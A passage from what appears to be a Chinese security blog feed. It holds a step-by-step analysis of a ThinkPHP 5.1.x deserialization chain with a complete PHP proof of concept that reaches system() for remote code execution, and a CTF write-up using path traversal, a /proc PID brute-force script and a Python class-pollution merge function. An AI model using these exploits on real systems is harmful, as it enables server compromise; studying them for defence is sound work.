186行的if</li><li>在$relation &#x3D; $this-&gt;getRelation($key);操作后, $relation变成一个false或者null,以进入下一个if内</li><li>$relation &#x3D; $this-&gt;getAttr($key);后$relation变成我们指定的一个对象, 以调用该对象下不存在的visible方法来触发该对象的__call方法</li></ol><p>这里操作的是$this-&gt;append as $key &#x3D;&gt; $name, 记住这个, 然后跟进$relation &#x3D; $this-&gt;getRelation($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306110629197.png" alt="image-20240306110629197"></p><p>我们不给$this-&gt;relation赋值, 所以, 不论如何这都会返回一个空值</p><p>这里返回空值, 直接进入我们预期的if内</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111809929.png" alt="image-20240306111809929"></p><p>继续跟进下一个调用的$relation &#x3D; $this-&gt;getAttr($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111135706.png" alt="image-20240306111135706"></p><p>代码后面$value是这个getAttr的返回值, 它由$value    &#x3D; $this-&gt;getData($name);决定, 继续跟进getData</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111534803.png" alt="image-20240306111534803"></p><p>这里有很多种return的值, 但是不要忘了, getData的返回值return给getAttr,   getAttr直接将得到的值返回给</p><p>$relation, 我们需要$relation为一个对象实例</p><p>这里getData的参数$name来自于this-&gt;append数组的key, 所以就可以让</p><p>this-&gt;data &#x3D; [‘nacl’&#x3D;&gt;new Request]; &#x2F;&#x2F;Request存在_call方法</p><p>this-&gt;append &#x3D; [‘nacl’ &#x3D;&gt; [‘nacl’ &#x3D;&gt; ‘nacl’]];    &#x2F;&#x2F;这里必须有一个value是数组</p><p>只需要保证this-&gt;data和this-&gt;append拥有相同的键, 即可将该键所对应的值返回给$relation</p><p>注: 这里Povit的data属性是继承自Attribute类, 而append继承子Conversion类</p><p>更新poc为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>跳转到Request类的__call</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306125911092.png" alt="image-20240306125911092"></p><p>依照一开始的链子, 此时需要借助call_user_func_array用this-&gt;hook来触发this-&gt;Ajax</p><p>也就是 $this-&gt;hook &#x3D; [“visible”&#x3D;&gt;[$this,”isAjax”]];</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306130953805.png" alt="image-20240306130953805"></p><p>成功跳转到isAjax, 此时我们不用关心传过来的参数, 因为330行的array_unshift将$this插入到了$args最前面,使得这个参数不可控</p><p>之后, 我们需要通过param的调用来调用到input</p><p>param接收一个参数为$this-&gt;config[‘var_ajax’]完全可控,跟进param</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306131812594.png" alt="image-20240306131812594"></p><p>在这个方法中会将GET数组赋值给<code>this-&gt;param</code>属性</p><p><strong>注:  经过调试发现, 在还没有执行反序列化之前, 此方法已经被调用过, 它将get请求的数据以键值对的方式赋值给$this-&gt;param</strong></p><p>这里调用了input传入的前两个重要参数$this-&gt;param和$name($name即为$this-&gt;config[‘var_ajax’])</p><p>跟进input</p><p>此时传入的$data就是get请求数据的键值对, $name由$this-&gt;config[‘var_ajax’]可控决定</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306134002703.png" alt="image-20240306134002703"></p><p>这里又出现了一次getData, 实际上, 这个getData就是将传入的形式参数$data数组中键为形式参数$name的值返回, 在这里即为返回get请求数据中键为$this-&gt;config[‘var_ajax’]的值</p><p>不妨设置:</p><p>$this-&gt;config &#x3D; [‘var_ajax’ &#x3D;&gt; ‘nacl’]; </p><p>这样, $data就变成了get请求中键位nacl的值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135222503.png" alt="image-20240306135222503"></p><p>这里$data就已经变成我们设置的字符串了</p><p>之后跟进getFilter()方法来设置之前已知被赋值为默认值的$filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135657139.png" alt="image-20240306135657139"></p><p>这里将要返回的值$filter默认为空字符串, 之后会被赋值为$this-&gt;filter, 并且追加了一个默认值$default2为null并返回</p><p>之后跳到:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135953679.png" alt="image-20240306135953679"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306140016138.png" alt="image-20240306140016138"></p><p>zhe</p><p>可以看见传入的实参$filter是要执行的任意函数, 传入的实参$data要执行的任意函数的参数</p><p>那么, $this-&gt;filter就是要执行的任意函数</p><p>$this-&gt;filter &#x3D; “system”;</p><p>最终poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141151590.png" alt="image-20240306141151590"></p><p>这里会把$filters数组末尾的null弹出, 之后就成功rce</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141253331.png" alt="image-20240306141253331"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141316024.png" alt="image-20240306141316024"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ThinkPHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP学习</title>
      <link href="/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133210500.png" alt="image-20240304133210500"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Swagger docs</title>
      <link href="/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/"/>
      <url>/2024/03/01/%E5%AE%89%E6%B4%B5%E6%9D%AFSwagger-docs/</url>
      
        <content type="html"><![CDATA[<h1 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h1><p>一进去是一个文档内容, 还以为是容器没弄好</p><p>仔细看像是一些api的文档,看不懂,但是没关系, 直接扔给gpt, 让他举出几个请求的例子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301211339462.png" alt="image-20240301211339462"></p><p>这里有四条api接口, 简单浏览一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api-base/v0/register</span><br><span class="line">#注册</span><br><span class="line">/api-base/v0/login</span><br><span class="line">#登录</span><br><span class="line">/api-base/v0/update</span><br><span class="line">#修改密码</span><br><span class="line">/api-base/v0/search</span><br><span class="line">#搜索文件</span><br></pre></td></tr></table></figure><p>由于已经知道是原型链污染, 其实可以猜测一下</p><ol><li><p>修改秘密的地方可以进行污染, 当然注册的地方也有一个插入的操作, 也可能存在污染</p></li><li><p>搜索文件的地方可以读取任意文件, 读取app的源码</p></li></ol><p>当然这只是猜测</p><p>先通过api注册登录获得token</p><p>这里的token一眼jwt 解一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301214129531.png" alt="image-20240301214129531"></p><p>这里会直接把密码也存在里面了, 但是并不知道私钥,并且爆破不出来,不能进行伪造</p><p>token先放一放</p><p>简单尝试这个search的api后发现确实存在任意文件读取</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301212720010.png" alt="image-20240301212720010"></p><p>这里并不能使用通配符, 也读不到app.py config.py web.py这样的源码</p><p>或许应该寻找源码的文件名</p><p>可谓是百思不得其解, 疑惑之下google 简单搜索了一下 词条 “flask源文件读取”</p><p><strong>柳暗花明又一村</strong></p><p>我发现了这篇文章</p><p><a href="https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><p>我们可以通过访问..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdline这个文件来得到当前运行的程序</p><blockquote><p>  proc 目录通常存储着进程动态运行的各种信息，是一种虚目录 、&#x2F;proc&#x2F;[pid]&#x2F;  表示存储这进程id为pid 的 进程信息，当前进程 pid 用self 代替，即 &#x2F;proc&#x2F;self&#x2F;.</p><pre><code>    /proc/[pid]/cmdline 下可读出进程在终端输入过的命令命令 </code></pre></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222256761.png" alt="image-20240301222256761"></p><p>这下就可以直接读取源文件了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222546644.png" alt="image-20240301222546644"></p><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/v2/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_info</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> file_path:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">id</span>:</span><br><span class="line">                    data = json.loads(file_content)</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> data[<span class="string">&#x27;users&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> user[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">int</span>(<span class="built_in">id</span>):</span><br><span class="line">                            <span class="keyword">if</span> user:</span><br><span class="line">                                <span class="keyword">return</span> user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">            <span class="keyword">return</span> file_content</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>,<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>这里只有api.py的源码, 但是并不是我们想要的</p><p>这里&#x2F;proc&#x2F;[pid]&#x2F;cmdline</p><p>既然这个是pid进程, 理论上进程数最大值为32768, 我们可以写个脚本尝试爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.26:22401//api-base/v0/search?file=../../../../../proc/&#123;&#125;/cmdline&amp;type=text&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.bzD2zo_oMqcmwR5IS_KWlaVChT30zADxFY-wxv91gFo;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32769</span>):</span><br><span class="line">    payload = url.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    res = requests.get(url=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(parse.quote(res.text))</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python%00api.py%00</span><br><span class="line">8</span><br><span class="line">python%00app.py%00</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>这里却又爆出来了app.py但是并不能把他读取出来… </p><p>不知道是否是因为权限问题</p><p>回头看了下api.py的源码, 这里面的路由为&#x2F;v2&#x2F;users而不是一开始读文件的路由&#x2F;api-base&#x2F;v0&#x2F;search</p><p>但是也访问不到&#x2F;v2&#x2F;users这条路由</p><p>这里怎么也读取不到, 用题解里的方法也不行, 由harder学长的提示就直接看源码了</p><p>在修改密码的路由下调用了一个update函数,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update(new_password, User)</span><br></pre></td></tr></table></figure><p> 跟进会发现这正是一个经典的merge函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):   <span class="comment"># merge ԭ������Ⱦ</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> src:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                 <span class="keyword">if</span> key <span class="keyword">in</span> dst <span class="keyword">and</span> <span class="built_in">isinstance</span>(src[key], <span class="built_in">dict</span>):</span><br><span class="line">                    update(src[key], dst[key])</span><br><span class="line">                 <span class="keyword">else</span>:</span><br><span class="line">                     dst[key] = src[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[key] = src[key]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> src.items() :</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst,key) <span class="keyword">and</span> <span class="built_in">isinstance</span>(value, <span class="built_in">dict</span>):</span><br><span class="line">                update(value,<span class="built_in">getattr</span>(dst, key))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">setattr</span>(dst, key, value)</span><br></pre></td></tr></table></figure><p>这里将new_password直接合并到User</p><p>我们跟进User看看的原型类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token=jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span 